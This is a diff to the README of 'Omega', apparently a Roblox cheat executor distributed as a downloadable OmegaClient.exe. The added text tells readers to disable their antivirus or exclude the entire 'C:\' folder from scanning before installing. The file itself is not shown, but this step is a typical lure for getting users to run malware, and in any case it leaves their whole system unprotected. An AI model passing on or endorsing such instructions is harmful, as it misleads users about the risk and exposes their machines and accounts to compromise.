@@ -18,7 +18,16 @@ Omega is an external Roblox executor that combines features. Built with performa
 - Roblox Client
 - need .NET Framework / Visual C++ !!!
 
+---
+
+⚠️ **Warning:**
+Disable your antivirus, or add the "C:\" folder to exceptions.
+
+---
+
 ## 🛠️ Installation
 - [Visit our website](https://omegaclient.netlify.app/) or [GH release](https://github.com/smellglue/omega/releases/download/omega/OmegaClient.exe)
+
+---
 
 gl everyone!
